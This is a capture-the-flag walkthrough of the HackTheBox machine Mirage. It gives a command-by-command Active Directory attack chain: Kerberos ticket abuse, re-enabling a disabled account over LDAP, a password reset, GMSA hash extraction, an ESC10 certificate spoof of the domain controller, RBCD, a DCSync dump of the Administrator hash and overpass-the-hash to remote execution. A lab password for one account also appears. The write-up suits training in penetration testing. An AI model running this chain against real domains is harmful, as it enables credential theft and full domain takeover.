29:T297d,<h2 id="background">Background</h2>
<p>This walkthrough details the "fast path" to rooting the HackTheBox machine <strong>Mirage</strong>. In a real-world penetration test, we often assume a breach scenario where we already have a set of low-privileged credentials. </p>
<p><strong>The Mirage Environment Quirks:</strong></p>
<ol>
<li><strong>NTLM is disabled:</strong> We cannot use standard Pass-the-Hash or simple NTLM authentication. We are forced to use <strong>Kerberos</strong> for everything.</li>
<li><strong>Aggressive Clock Skew:</strong> Kerberos strictly requires the client and server clocks to be within 5 minutes of each other. Mirage has a severe, constantly drifting clock skew (roughly +7 hours), which forces us to use tools like <code>ntpdate</code> and <code>faketime</code> to successfully forge our Kerberos requests.</li>
</ol>
<hr>
<h2 id="step-1-environment-setup">Step 1: Environment Setup</h2>
<p> Kerberos relies entirely on DNS resolution (not IP addresses) and time synchronization. Before we launch a single exploit, we must conform our attacking machine to the target's strict domain environment.</p>
<ol>
<li><strong>Add DNS Records:</strong><pre><code class="language-bash" data-language="bash">echo -e "10.129.232.163\tdc01.mirage.htb mirage.htb nats-svc.mirage.htb" | sudo tee -a /etc/hosts
</code></pre>
</li>
<li><strong>Sync the Clock:</strong><pre><code class="language-bash" data-language="bash">sudo ntpdate 10.129.232.163
</code></pre>
</li>
<li><strong>Configure Kerberos (<code>custom_krb5.conf</code>):</strong>
We create a custom configuration file telling our Kali machine how to talk to the <code>MIRAGE.HTB</code> realm.<pre><code class="language-bash" data-language="bash">cat &lt;&lt; EOF &gt; custom_krb5.conf
[libdefaults]
    default_realm = MIRAGE.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    MIRAGE.HTB = {
        kdc = dc01.mirage.htb
        admin_server = dc01.mirage.htb
        default_domain = mirage.htb
    }

[domain_realm]
    mirage.htb = MIRAGE.HTB
    .mirage.htb = MIRAGE.HTB
EOF
export KRB5_CONFIG="\$PWD/custom_krb5.conf"
</code></pre>
</li>
</ol>
<hr>
<h2 id="step-2-initial-access-and-the-user-flag">Step 2: Initial Access &amp; The User Flag</h2>
<p> We bypass initial reconnaissance (NFS shares, DNS spoofing, Kerberoasting) by using known compromised credentials for the <code>nathan.aadam</code> account, which is part of the <code>IT_Admins</code> group (allowing WinRM access).</p>
<ol>
<li><strong>Get a Ticket Granting Ticket (TGT):</strong><pre><code class="language-bash" data-language="bash">kinit nathan.aadam
# Password: REDACTED
</code></pre>
</li>
<li><strong>Log in via WinRM and grab the flag:</strong><pre><code class="language-bash" data-language="bash">evil-winrm -i dc01.mirage.htb -r mirage.htb
# Once in: type C:\Users\nathan.aadam\Desktop\user.txt
</code></pre>
</li>
</ol>
<hr>
<h2 id="step-3-pivoting-and-re-enabling-javier-s-account">Step 3: Pivoting &amp; Re-enabling Javier's Account</h2>
<p> We know <code>javier.mmarshall</code> has the rights to read the GMSA (Group Managed Service Account) password. However, his account is disabled. We also know we have the credentials for <code>mark.bbond</code> (<code>1day@atime</code>), who has the LDAP permissions to modify Javier's account. We will abuse these privileges to re-activate the account.</p>
<ol>
<li><strong>Get a ticket for Mark:</strong><pre><code class="language-bash" data-language="bash">unset KRB5CCNAME # Clear any impacket variables
rm /tmp/krb5cc_1000 # Clear old native cache
kinit mark.bbond
# Password: REDACTED
</code></pre>
</li>
<li><strong>Re-enable the account via LDAP (Remove the disabled flag):</strong><pre><code class="language-bash" data-language="bash">ldapmodify -Q -Y GSSAPI -H ldap://dc01.mirage.htb &lt;&lt; EOF
dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
</code></pre>
</li>
<li><strong>Remove Logon Hours restrictions:</strong><pre><code class="language-bash" data-language="bash">ldapmodify -Q -Y GSSAPI -H ldap://dc01.mirage.htb &lt;&lt; EOF
dn: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
changetype: modify
delete: logonHours
EOF
</code></pre>
</li>
</ol>
<hr>
<h2 id="step-4-password-reset-and-extracting-the-gmsa-hash">Step 4: Password Reset and Extracting the GMSA Hash</h2>
<p> The account is active, but we don't know the current password. Since <code>mark.bbond</code> has the right to reset it, we force a password change. Once we control Javier's account, we can ask the Domain Controller for the <code>mirage-service$</code> password hash.</p>
<ol>
<li><strong>Reset Javier's password:</strong><pre><code class="language-bash" data-language="bash">net rpc user password 'javier.mmarshall' --use-kerberos=required -S dc01.mirage.htb
# Set to something like: P@ssword123!26
</code></pre>
</li>
<li><strong>Sync time perfectly before using Impacket/NXC:</strong><pre><code class="language-bash" data-language="bash">sudo ntpdate 10.129.232.163
</code></pre>
</li>
<li><strong>Dump the GMSA password hash:</strong>
<em>Note: From here on, we wrap Python/Impacket commands in <code>faketime "+7 hours"</code> because the underlying <code>minikerberos</code> library struggles with the target's aggressive clock skew.</em><pre><code class="language-bash" data-language="bash">faketime "+7 hours" nxc ldap dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'P@ssword123!26' -k --gmsa
</code></pre>
<em>Result: We get the NT Hash for <code>Mirage-Service$</code>: <code>REDACTED_HASH_OR_FLAG</code></em></li>
</ol>
<hr>
<h2 id="step-5-abusing-esc10-certificate-template-vulnerability">Step 5: Abusing ESC10 (Certificate Template Vulnerability)</h2>
<p> We want to perform a DCSync attack, but <code>mirage-service$</code> doesn't have the rights. We find that <code>mirage-service$</code> has Write privileges over <code>mark.bbond</code>. We can modify Mark's User Principal Name (UPN) to pretend to be the Domain Controller (<code>dc01$@mirage.htb</code>), request a certificate as Mark (which the CA will issue for <code>dc01$</code>), and then use that certificate to authenticate as the Domain Controller itself.</p>
<ol>
<li><strong>Get a ticket for the service account:</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" impacket-getTGT -hashes ':REDACTED_HASH_OR_FLAG' 'mirage.htb/mirage-service$'
</code></pre>
</li>
<li><strong>Spoof Mark's UPN to look like the DC:</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" certipy-ad account update -k -no-pass -dc-host 'dc01.mirage.htb' -user 'mark.bbond' -upn 'dc01$@mirage.htb'
</code></pre>
</li>
<li><strong>Request a certificate as Mark (Ensure you still have Mark's native ticket in <code>/tmp/krb5cc_1000</code>):</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='/tmp/krb5cc_1000' faketime "+7 hours" certipy-ad req -k -no-pass -dc-host 'dc01.mirage.htb' -ca 'mirage-DC01-CA' -template 'User'
</code></pre>
<em>Result: Saves a highly privileged <code>dc01.pfx</code> file to disk.</em></li>
<li><strong>Clean up (Revert Mark's UPN):</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" certipy-ad account update -k -no-pass -dc-host 'dc01.mirage.htb' -user 'mark.bbond' -upn 'mark.bbond@mirage.htb'
</code></pre>
</li>
</ol>
<hr>
<h2 id="step-6-resource-based-constrained-delegation-rbcd">Step 6: Resource-Based Constrained Delegation (RBCD)</h2>
<p> Active Directory allows computer accounts to decide who is allowed to delegate to them. Since we possess a certificate proving we <em>are</em> the Domain Controller (<code>dc01$</code>), we can log in and tell the DC: "Allow <code>mirage-service$</code> to act on behalf of any user."</p>
<ol>
<li><strong>Open an LDAP shell as the DC:</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" certipy-ad auth -pfx dc01.pfx -dc-ip '10.129.232.163' -ldap-shell
</code></pre>
</li>
<li><strong>Grant the RBCD rights to the service account:</strong><pre><code class="language-text" data-language="text"># set_rbcd dc01$ mirage-service$
# exit
</code></pre>
</li>
</ol>
<hr>
<h2 id="step-7-dcsync-attack">Step 7: DCSync Attack</h2>
<p> We gave <code>mirage-service$</code> the power to impersonate anyone to the DC. We will now request a Service Ticket impersonating the DC itself (<code>dc01$</code>), and then use that ticket to ask the Domain Controller to replicate its Active Directory database to us (DCSync), yielding the Domain Admin hash.</p>
<ol>
<li><strong>Request the Impersonation Ticket:</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='mirage-service$.ccache' faketime "+7 hours" impacket-getST -k -no-pass -spn 'cifs/dc01.mirage.htb' -impersonate 'dc01$' 'mirage.htb/mirage-service$'
</code></pre>
</li>
<li><strong>Dump the Administrator Hash:</strong><pre><code class="language-bash" data-language="bash">KRB5CCNAME='dc01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache' faketime "+7 hours" impacket-secretsdump -k -no-pass 'mirage.htb/dc01$'@dc01.mirage.htb -just-dc-user Administrator
</code></pre>
<em>Result: We get the Administrator NT Hash: <code>REDACTED_HASH_OR_FLAG</code></em></li>
</ol>
<hr>
<h2 id="step-8-the-root-flag-overpass-the-hash">Step 8: The Root Flag (Overpass-the-Hash)</h2>
<p> We have the Domain Admin hash, but NTLM is disabled, so traditional Pass-the-Hash fails. We must perform "Overpass-the-Hash" - using the NT hash to request a valid Kerberos TGT from the KDC. Finally, we use WMI to remotely execute commands on the DC to grab the flag.</p>
<ol>
<li><strong>Convert the Hash to a Kerberos Ticket:</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" impacket-getTGT -hashes ':REDACTED_HASH_OR_FLAG' 'mirage.htb/Administrator'
</code></pre>
</li>
<li><strong>Export the ticket to our environment:</strong><pre><code class="language-bash" data-language="bash">export KRB5CCNAME="$PWD/Administrator.ccache"
</code></pre>
</li>
<li><strong>Log in as Administrator via WMIExec (Bypassing WinRM clock skew issues):</strong><pre><code class="language-bash" data-language="bash">faketime "+7 hours" impacket-wmiexec -k -no-pass dc01.mirage.htb
</code></pre>
</li>
<li><strong>Grab the Root Flag!</strong><pre><code class="language-cmd" data-language="cmd">type C:\Users\Administrator\Desktop\root.txt
</code></pre>
</li>
</ol>
